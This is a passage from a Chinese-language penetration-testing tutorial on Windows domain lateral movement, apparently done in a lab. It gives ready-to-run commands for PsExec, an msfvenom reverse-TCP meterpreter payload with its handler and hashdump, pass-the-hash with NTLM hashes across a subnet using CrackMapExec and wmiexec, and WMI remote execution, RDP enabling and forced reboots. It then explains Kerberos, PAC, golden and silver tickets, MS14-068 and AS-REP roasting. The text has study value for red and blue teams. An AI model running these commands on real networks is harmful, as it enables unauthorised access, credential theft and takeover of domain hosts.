<li>在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务， 命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生 大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</li>
<li>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是 administrator 权限的 shell</li>
<li>在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能， 只能依靠账号和密码进行传递。</li>
</ul>
<p>登陆域管理命令 </p>
<p>impacket 下的 psexec </p>
<p>python3 psexec.py moonsec/<a href="mailto:Administrator@192.168.0.142">Administrator@192.168.0.142</a> </p>
<p>执行命令后输入密码 </p>
<p>登陆其他主机管理员 d</p>
<p>psexec /accepteula /s \12server1 -u Administrator -p 123456 cmd</p>
<h4 id="使用-msf-hash-模块"><a href="#使用-msf-hash-模块" class="headerlink" title="使用 msf hash 模块"></a><strong>使用</strong> msf hash <strong>模块</strong></h4><p>msf 生成后门 </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=6666 LHOST=192.168.0.115 -f exe -o msf.exe </span><br></pre></td></tr></tbody></table></figure>

<p>监听端口 </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp </span><br><span class="line">set lhost 192.168.0.115 </span><br><span class="line">set lport 6666 </span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure>

<p>监听到之后</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump	//导出hash</span><br><span class="line">background	//将此模块放到后台</span><br></pre></td></tr></tbody></table></figure>

<p>使用psexec模块</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set rhosts 192.168.0.141</span><br><span class="line">set smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f4e701f21886ccc0a5e137.png"></p>
<h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>CrackMapExec 可以对 C 段中的主机进行批量 pth</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec.git">https://github.com/byt3bl33d3r/CrackMapExec.git</a></p>
<p>使用命令：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 192.168.0.0/24 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4</span><br></pre></td></tr></tbody></table></figure>

<p>对 192.168.9.0/24 C 段进行批量 pass the hash</p>
<p><img src="https://pic.imgdb.cn/item/66f4ed8ef21886ccc0ab44b4.png"></p>
<h4 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h4><p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具， Windows 98 以后的操作系统都支持 WMI。 </p>
<p>由于 Windows 默认<strong>不会将 WMI 的操作记录在日志里</strong>，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。</p>
<h4 id="wmic-命令"><a href="#wmic-命令" class="headerlink" title="wmic 命令"></a>wmic <strong>命令</strong></h4><p>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目标主机 C 盘的 ip.txt 文件中</p>
<p>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口 ( 135 端⼝是 WMIC 默认的管理端口，wimcexec 使用445 端口传回显)</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.0.141 /user:administrator /password:123456 process call create "cmd.exe /c ipconfig &gt; c:\ip.txt"</span><br><span class="line">192.168.0.141:域控主机</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f60792f21886ccc0874ccb.png"></p>
<p>之后建立 IPC$ ，使用 type 读取执行结果 </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.0.141\ipc$ "123456" /user:administrator </span><br><span class="line">type \\192.168.0.141\c$\ip.txt</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f6111df21886ccc09091fa.png"></p>
<h4 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h4><p>在 impacket 工具包里有 wmiexec.py 脚本，可以用来直接获取 shell 其他攻击手法可以看下 readme，这里只简单的对 pth 做一下实验：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 Administrator@192.168.0.141 "whoami"</span><br></pre></td></tr></tbody></table></figure>

<p>-hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:</p>
<p>//这部分指定了 NTLM 哈希认证</p>
<ul>
<li><code>aad3b435b51404eeaad3b435b51404ee</code> 是一个固定值，表示密码为空的 NTLM 哈希；</li>
<li><code>32ed87bdb5fdc5e9cba88547376818d4</code> 是目标用户（此处为 <code>Administrator</code>）的 NTLM 哈希值。</li>
</ul>
<p>wmiexec.py 的 hash 参数格式为 LM Hash:NT Hash 00000000000000000000000000000000 这个部分可以随便填写</p>
<p><img src="https://pic.imgdb.cn/item/66f61c91f21886ccc09a1c4d.png"></p>
<p>wmiexec.py 明文获取 shell</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py administrator:123456@192.168.0.123</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f61dbbf21886ccc09b094a.png"></p>
<h4 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h4><p>VBS文件是指使用VBScript（Visual Basic Scripting Edition）编写的脚本文件。VBScript是一种轻量级的脚本语言，由微软开发，主要用于网页开发和自动化任务。VBS文件的扩展名为<code>.vbs</code>，可以在Windows操作系统中运行。</p>
<p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能</p>
<p>wmiexec.vbs 下载地址：<a target="_blank" rel="noopener" href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //nologo wmiexec.vbs /shell 192.168.0.123 administrator 123456</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f62103f21886ccc09df266.png"></p>
<p>使用 vmiexec.vbs 执行单条命令</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs /cmd 192.168.0.123 administrator 123456 "ipconfig"</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f62267f21886ccc09f264f.png"></p>
<h4 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h4><p>Invoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是<strong>利用 Powershell 调用 WMI</strong> 来远程执行命令。</p>
<p>在 Powershell 中运行以下命令 </p>
<p>导入 Invoke-WmiCommand.ps1 脚本</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-WmiCommand.ps1</span><br></pre></td></tr></tbody></table></figure>

<p>指定目标系统用户名 </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$User = ".\administrator"</span><br></pre></td></tr></tbody></table></figure>

<p>指定目标系统的密码 </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Password = ConvertTo-SecureString -String "123456" -AsPlainText -Force</span><br></pre></td></tr></tbody></table></figure>

<p>将账号和密码整合起来，以便导入 Credential </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br></pre></td></tr></tbody></table></figure>

<p>指定要执行的命令和目标 IP </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -Comp uterName 192.168.0.141</span><br></pre></td></tr></tbody></table></figure>

<p>将执行结果输出到屏幕上 </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Remote.PayloadOutput</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f6741cf21886ccc0fabce5.png"></p>
<h4 id="Invoke-WMIMethod"><a href="#Invoke-WMIMethod" class="headerlink" title="Invoke-WMIMethod"></a>Invoke-WMIMethod</h4><p>Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 指定目标系统用户名</span><br><span class="line">$User=".\administrator"</span><br><span class="line"># 指定目标系统密码</span><br><span class="line">$Password=ConvertTo-SecureString -String "123456" -AsPlainText -Force</span><br><span class="line"># 将账号和密码整合起来，以便导入 Credential 中</span><br><span class="line">$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br><span class="line"># 在远程系统中运行 calc.exe 命令</span><br><span class="line">Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "192.168.0.141" -Credential $Cred</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66fb6932f21886ccc09121db.png"></p>
<p>可以看到 目标 192.168.0.141 上已经执行了 calc</p>
<h4 id="wmic-的其他命令"><a href="#wmic-的其他命令" class="headerlink" title="wmic 的其他命令"></a>wmic <strong>的其他命令</strong></h4><p>使用 wmic 远程开启目标的 RDP（3389）</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 适于 Windows xp、server 2003</span><br><span class="line">wmic /node:192.168.7.7 /user:administrator /password:123456 PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line"># 适于 Windows 7、8、10，server 2008、2012、2016，注意 ServerName 需要改为目标的 hostname</span><br><span class="line">wmic /node:192.168.0.123 /user:administrator /password:123456 RDTOGGLE WHERE ServerName='计算机名' call SetAllowTSConnections 1</span><br><span class="line">或者</span><br><span class="line">wmic /node:192.168.0.123 /user:administrator /password:123456 process call create 'cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66fb6a7af21886ccc0920b29.png"></p>
<img src="https://pic.imgdb.cn/item/66fb6a91f21886ccc0921a36.png" style="zoom:67%;">

<p>可以看到目标上的远程终端已经开启。</p>
<p>判断 RDP 有没有开可以使用以下命令，如果返回 0x0 表示开启，返回 0x1 表示关闭。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66fb6b01f21886ccc09262a7.png"></p>
<p>远程重启机子</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.0.141 /user:administrator /password:123456 process call create "shutdown.exe -r -f -t 0"</span><br></pre></td></tr></tbody></table></figure>



<h3 id="PTT-票据传递攻击-Pass-the-Ticket"><a href="#PTT-票据传递攻击-Pass-the-Ticket" class="headerlink" title="PTT 票据传递攻击(Pass the Ticket)"></a>PTT <strong>票据传递攻击</strong>(Pass the Ticket)</h3><h4 id="Kerberos-协议-Kerberos-认证原理"><a href="#Kerberos-协议-Kerberos-认证原理" class="headerlink" title="Kerberos 协议&amp; Kerberos 认证原理"></a>Kerberos <strong>协议</strong>&amp; Kerberos <strong>认证原理</strong></h4><p><img src="https://pic.imgdb.cn/item/66fb6c30f21886ccc09352b3.png"></p>
<p>Kerberos 协议是一种计算机<strong>网络授权协议</strong>，用来在非安全网络中，对个人通信以安全的手段进行身份认证。其设计目标是通过密钥系统为客户机与服务器应用程序<strong>提供强大的认证服务</strong>。该协议的认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的<strong>第三方认证服务</strong>，是通过传统的密码技术（如：共享密钥）执行认证服务的。Kerberos 协议在在内网域渗透领域中至关重要，白银票据、黄金票据、攻击域控等都离不开 Kerberos 协议</p>
<p><img src="https://pic.imgdb.cn/item/66fbed4df21886ccc0053b5a.png"></p>
<p>几个关键角色:</p>
<table>
<thead>
<tr>
<th>角色</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>Domain Controller(DC)</td>
<td>域控制器，简称 DC，一台计算机， 实现用户、计算机的统一管理。</td>
</tr>
<tr>
<td>Key Distribution Center</td>
<td>秘钥分发中心，简称 KDC，默认安装在域控里，包括 AS 和 TGS。</td>
</tr>
<tr>
<td>Authentication Service</td>
<td>身份验证服务，简称 AS，用于 KDC 对 Client 认证。</td>
</tr>
<tr>
<td>Ticket Grantng Service</td>
<td>票据授予服务，简称 TGS，用于 KDC 向 Client 和 Server 分发 Session Key（临时秘钥）。</td>
</tr>
<tr>
<td>Active Directory</td>
<td>活动目录，简称 AD，用于存储用户、用户组、域相关的信息。</td>
</tr>
<tr>
<td>Client</td>
<td>客户端，指用户。</td>
</tr>
<tr>
<td>Server</td>
<td>服务端，可能是某台计算机，也可 能是某个服务。</td>
</tr>
</tbody></table>
<h3 id="Kerberos-认证原理"><a href="#Kerberos-认证原理" class="headerlink" title="Kerberos 认证原理"></a>Kerberos <strong>认证原理</strong></h3><h4 id="总图："><a href="#总图：" class="headerlink" title="总图："></a>总图：</h4><p><img src="https://pic.imgdb.cn/item/6700ded4d29ded1a8cb9fc4d.png"></p>
<p>认证过程：d</p>
<p><img src="https://pic.imgdb.cn/item/66fbf192f21886ccc0094eb2.png"></p>
<ol>
<li><p>首先 Client 向域控制器 DC 请求访问 Server，DC 通过去 AD 活动目录中查找依次区分 Client 来判断 Client 是否可信。 </p>
</li>
<li><p>认证通过后返回 TGT 给 Client，Client 得到 TGT（Ticket Granting Ticket）。</p>
</li>
<li><p>Client 继续拿着 TGT 请求 DC 访问 Server，TGS 通过 Client 消息中的 TGT， 判断 Client 是否有访问权限。 </p>
</li>
<li><p>如果有，则给 Client 有访问 Server 的权限 Ticket，也叫 ST（Service Ticket）。 </p>
</li>
<li><p>Client 得到 Ticket 后，再去访问 Server，且该 Ticket 只针对这一个 Server 有效。 </p>
</li>
<li><p>最终 Server 和 Client 建立通信。</p>
</li>
</ol>
<p>详细的认证步骤，大概分为三个阶段：</p>
<ul>
<li><p>ASREQ &amp; ASREP </p>
</li>
<li><p>TGSREQ &amp; TGSREP </p>
</li>
<li><p>AP-REQ &amp; AP-REP</p>
</li>
</ul>
<h4 id="AS-REQ-AS-REP"><a href="#AS-REQ-AS-REP" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h4><p>该阶段是 Client 和 AS 的认证，通过认证的客户端将获得 TGT 认购权证。</p>
<p><img src="https://pic.imgdb.cn/item/66fe09a40a206445e38972f3.png"></p>
<p>​		当域内某个客户端用户 Client 访问域内的某个服务，于是输入用户名和密码，此时<strong>客户端本机的 Kerberos 服务</strong>会向 <strong>KDC 的 AS 认证服务</strong>发送一个 <u>AS_REQ</u> 认证请求。请求的凭据是 Client 的哈希值 NTLM-Hash 以及哈希值加密的时间戳、Clientinfo、Server-info 等数据，以及一些其他信息。</p>
<p>​		当 Client 发送身份信息给 AS 后，AS 会<strong>先向活动目录 AD 请求</strong>，询问是否有此 Client 用户，如果有的话，就会取出它的 NTLM-Hash，并对 AS_REQ 请求中加密的时间戳进行解密，如果解密成功，则证明客户端提供的密码正确，如果时间戳在五分钟之内，则预认证成功。然后 AS 会生成一个<strong>临时秘钥 Session-Key AS</strong>，并使用客户端 Client 的 NTLM-Hash 加密 Session-key AS 作为响应包的一部分内容。此 Session-key AS 用于确保客户端和 TGS 之间的通信安全。</p>
<p>​		还有一部分内容就是 TGT：使用 KDC <strong>一个特定账户的 NTLM-Hash</strong> 对 Session-key AS、时间戳、Client-info 进行的加密。这个特定账户就是创建域控时自动生成的 <strong>Krbtgt 用户</strong>，然后将这两部分以及 PAC 等信息回复给 Client，即 <u>AS_REP</u>。PAC 中包含的是用户的 SID、用户所在的组等一些信息。</p>
<blockquote>
<p>AS-REP 中最核心的东西就是 Session-key 和 TGT。我们平时用 Mimikatz、kekeo、rubeus 等工具生成的凭据是 .kirbi 后缀，Impacket 生 成的凭据的后缀是 .ccache。这两种票据主要包含的都是 Session-key 和 TGT，因此可以相互转化。</p>
</blockquote>
<p>至此，Kerberos 认证的第一步完成。</p>
<h4 id="TGS-REQ-TGS-REP"><a href="#TGS-REQ-TGS-REP" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h4><p>该阶段是 Client 和 TGS 的认证，通过认证的客户端将获得 ST 服务票据。</p>
<p><img src="https://pic.imgdb.cn/item/66fe0be20a206445e38b5559.png"></p>
<p>​		客户端 Client 收到 AS 的回复 AS_REP 后分别获得了 TGT 和加密的 Session-Key AS。它会先用自己的 Client NTLM-hash 解密得到原始的 Session-Key AS，然后它会在<strong>本地缓存此 TGT 和原始的 Session-Key AS</strong>，如果现在它就需要访问某台服务器上的服务，他就需要凭借这张 TGT 认购凭证向 TGS 购买相应的 ST 服务票据（也叫Ticket）。</p>
<p>​		此时 Client 会使用 Session-Key AS 加密时间戳、Client-info、Server-info 等数据作为一部分。由于 TGT 是用 Krbtgt 账户的 NTLM-Hash 加密的，Client 无法解密，所以 Client 会将 <strong>TGT 作为另一部分继续发送给 TGS</strong>。两部分组成的请求被称为 <u>TGS_REQ</u>。</p>
<p>​		TGS 收到该请求，用 Krbtgt 用户的 NTLM-hash 先解密 TGT 得到 Session-key AS、 时间戳、Client-info 以及 Server-info。再用 Session-key AS 解密第一部分内容，得到 Client-info、时间戳。然后将两部分获取到时间戳进行比较，<u>如果时间戳跟当前时间相差太久，就需要重新认证</u>。TGS 还会将这个 Client 的信息与 TGT 中的 Client 信息进行比较，如果两个相等的话，还会继续判断 Client 有没有权限访问 Server， 如果都没有问题，认证成功。认证成功后，TGS 会生成一个 Session-key TGS，并用 Session-key AS 加密 Session-key TGS 作为响应的一部分。此 Session-key TGS 用于确保客户端和服务器之间的通信安全。</p>
<p>​		另一部分是使用服务器 Server 的 NTLM-Hash 加密 Session-key TGS、时间戳以及 Client-info 等数据生成的 ST。然后 TGS 将这两部分信息回复给 Client，即 <u>TGS_REP</u>。</p>
<p>至此，Client 和 KDC 的通信就结束了，然后是和 Server 进行通信。</p>
<h4 id="AP-REQ-AP-REP"><a href="#AP-REQ-AP-REP" class="headerlink" title="AP-REQ &amp; AP-REP"></a>AP-REQ &amp; AP-REP</h4><p>该阶段是 Client 和 TGS 的认证之后，通过认证的客户端将与服务器建立连接。</p>
<p><img src="https://pic.imgdb.cn/item/66fe0fa40a206445e38e68d2.png"></p>
<p>​		客户端 Client 收到 TGS_REP 后，分别获得了 ST 和加密的 Session-Key TGS。它会先使用本地缓存了的 Session-key AS 解密出了原始的 Session-key TGS。然后它会<strong>在本地缓存此 ST 和原始的 Session-Key TGS</strong>，当客户端需要访问某台服务器上的服务时会向服务器发送请求。它会使用 Session-key TGS 加密 Client-info、时间戳等信息作为一部分内容。ST 因为使用的是 Server NTLM-hash 进行的加密，无法解密，所以会原封不动发送给 Server。两部分一块发送给 Server，这个请求即是 <u>AP_REQ</u></p>
<p>​		Server 收到 AP_REQ 请求后，<strong>用自身的 Server NTLM-Hash 解密了 ST</strong>，得到 Session-Key TGS，再解密出 Client-info、时间戳等数据。然后与 ST 的 Clientinfo、时间戳等进行一一对比。时间戳有效时间一般时间为 8 小时。通过客户端身份验证后，服务器 Server 会<strong>拿着 PAC 去询问 DC 该用户是否有访问权限</strong>，DC 拿到 PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信息，然后将结果返回给服务端，服务端再将此信息域用户请求的服务资源的 ACL 进行对比，最后决定是否给用户提供相关的服务。通过认证后 Server 将返回最终的 <u>AP-REP</u> 并与 Client 建立通信</p>
<h3 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><p>Kerberos 认证流程的中提到了 PAC（Privilege Attribute Certificate），这是微软为了访问控制而引进的一个扩展，即<strong>特权访问证书</strong>。</p>
<p>在上面的认证流程中，如果没有 PAC 的访问控制作用的话，只要用户的身份验证正确，那么就可以拿到 TGT，有了 TGT，就可以拿到 ST，有了 ST ，就可以访问服务了。此时任何一个经过身份验证的用户都可以访问任何服务。像这样的认证只解决了 “Who am i?” 的问题，而没有解决 “What can I do?” 的问题。</p>
<p>为了解决上面的这个问题，微软引进了 PAC。即 KDC 向客户端 Client 返回 AS_REP 时插入了 PAC，<strong>PAC 中包含的是用户的 SID、用户所在的组等一些信息</strong>。当最后服务端 Server 收到 Client 发来的 AP_REQ 请求后，首先会对客户端身份验证。通过客户端身份验证后，服务器 Server 会拿着 PAC 去询问 DC 该用户是否有访问权限， DC 拿到 PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信息，然后将结果返回给服务端，服务端再将此信息域用户请求的服务资源的 ACL 进行对比，最后决定是否给用户提供相关的服务。</p>
<blockquote>
<p>但是在有些服务中并没有验证 PAC 这一步，这也是白银票据能成功的前提，因为就算拥有用户的 Hash，可以伪造 TGS，但是也不能制作 PAC， PAC 当然也验证不成功，但是有些服务不去验证 PAC，这是白银票据成功的前提。</p>
</blockquote>
<h3 id="Kerberos-认证中的相关安全问题概述"><a href="#Kerberos-认证中的相关安全问题概述" class="headerlink" title="Kerberos 认证中的相关安全问题概述"></a>Kerberos 认证中的相关安全问题概述</h3><p>Kerberos 认证并不是天衣无缝的，这其中也会有各种漏洞能够被我们利用，比如我们常说的 MS14-068、黄金票据、白银票据等就是基于 Kerberos 协议进行攻击的。下面我们便来大致介绍一下 Kerberos 认证中的相关安全问题。</p>
<h4 id="黄金票据（Golden-ticket）"><a href="#黄金票据（Golden-ticket）" class="headerlink" title="黄金票据（Golden ticket）"></a>黄金票据（Golden ticket）</h4><p>在 Windows 的 kerberos 认证过程中，Client 将自己的信息发送给 KDC，然后 KDC 使用 Krbtgt 用户的 NTLM-Hash 作为密钥进行加密，生成 TGT。那么<strong>如果获取到了 Krbtgt 的 NTLM-Hash 值，不就可以伪造任意的 TGT</strong> 了吗。因为 Krbtgt 只有域控制器上面才有，所以使用黄金票据意味着你之前拿到过域控制器的权限，黄金凭据可 以理解为一个后门。 </p>
<p>先假设这么一种情况，原先已拿到的域内所有的账户 Hash，包括 Krbtgt 这个账 户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置 Krbtgt 密码，基于此条件，我们还能利用该票据重新获得域管理员权限。利用 Krbtgt 的 Hash 值可以伪造生成任意的 TGT，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于 Kerberos 认证的任何服务。</p>
<h4 id="白银票据（Silver-ticket）"><a href="#白银票据（Silver-ticket）" class="headerlink" title="白银票据（Silver ticket）"></a><strong>白银票据（</strong>Silver ticket）</h4><p>白银票据不同于黄金票据，白银票据的利用过程是<strong>伪造 TGS</strong>，通过已知的授权服务密码生成一张可以访问该服务的 TGT。因为在票据生成过程中<strong>不需要使用KDC，所以可以绕过域控制器</strong>，很少留下日志。而黄金票据在利用过程中由 KDC 颁发 TGT，并且在生成伪造的 TGT 的20 分钟内，TGS 不会对该 TGT 的真伪进行效验。</p>
<p>白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用 Krbtgt 账号的密码哈希值，因此更加隐蔽。</p>
<h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><p>这里便用到了我们之前所讲到的 PAC 这个东西，PAC 是用来验证 Client 的访问权限的，它会被放在 TGT 里发送给 Client，然后由 Client 发送给 TGS。但也恰恰是这 个 PAC 造成了 MS14-068 这个漏洞。 </p>
<p>该漏洞是位于 kdcsvc.dll 域控制器的密钥分发中心（KDC）服务中的 Windows 漏 洞，它允许经过身份验证的用户在其获得的票证 TGT 中插入任意的 PAC 。普通用 户可以通过呈现具有改变了 PAC 的 TGT 来伪造票据获得管理员权限。</p>
<h4 id="密码喷洒攻击（Password-Spraying）"><a href="#密码喷洒攻击（Password-Spraying）" class="headerlink" title="密码喷洒攻击（Password Spraying）"></a><strong>密码喷洒攻击（</strong>Password Spraying<strong>）</strong></h4><p>在实际渗透中，许多渗透测试人员和攻击者通常都会使用一种被称为 “密码喷洒” （Password Spraying）的技术来进行测试和攻击。对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种<strong>针对所有用户的自动密码猜测通常是为了避免帐户被锁定</strong>，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。普通的爆破就是用户名固定，爆破密码，但是<strong>密码喷洒，是用固定的密码去跑用户名</strong>。</p>
<h4 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h4><p>我们前文说过，AS_REQ &amp; AS_REP 认证的过程是 Kerberos 身份认证的第一步，该过程又被称为预身份验证。预身份验证主要是为了防止密码脱机爆破。 </p>
<p>而如果域用户设置了选项 “Do not require Kerberos preauthentication”（该选项默认没有开启）关闭了预身份验证的话，攻击者可以使用指定的用户去请求票据，向域控制器发送 AS_REQ 请求，此时域控会不作任何验证便将 TGT 票据和加密的 Session-key 等信息返回。因此攻击者就可以对获取到的加密 Session-key 进行离线破解，如果爆破成功，就能得到该指定用户的明文密码。 </p>
<p>这种攻击方式被称作 AS-REP Roasting 攻击。</p>
<h3 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a><strong>票据传递攻击</strong></h3><h4 id="黄金票据-Golden-ticket"><a href="#黄金票据-Golden-ticket" class="headerlink" title="黄金票据 Golden ticket"></a><strong>黄金票据</strong> Golden ticket</h4><h5 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h5><p>在 Kerberos 认证中，Client 通过 AS(身份认证服务)认证后，AS 会给 Client 一个 Logon Session Key 和 TGT，而 Logon Session Key 并不会保存在 KDC 中，krbtgt 的 NTLM Hash 又是固定的，所以只要得到 krbtgt 的 NTLM Hash，就可以伪造 TGT 和 Logon Session Key 来进入下一步 Client 与 TGS 的交互。而且有了金票后，就可以跳过 AS 验证，不用验证账户和密码，所以也不担心域管密码修改</p>
<h5 id="2-特点"><a href="#2-特点" class="headerlink" title="2.特点"></a>2.特点</h5><ul>
<li><p>不需要与 AS 进行交互</p>
</li>
<li><p>需要用户 krbtgt 的 Hash</p>
</li>
</ul>
<h5 id="3-具体操作介绍"><a href="#3-具体操作介绍" class="headerlink" title="3.具体操作介绍"></a>3.具体操作介绍</h5><h6 id="一、伪造凭据，提升域内普通用户的权限"><a href="#一、伪造凭据，提升域内普通用户的权限" class="headerlink" title="一、伪造凭据，提升域内普通用户的权限"></a>一、伪造凭据，提升域内普通用户的权限</h6><p>整体思路：</p>
<p>​		如果当前用户为域用户，可以直接用 <code>whoami /user</code> 获取sid</p>
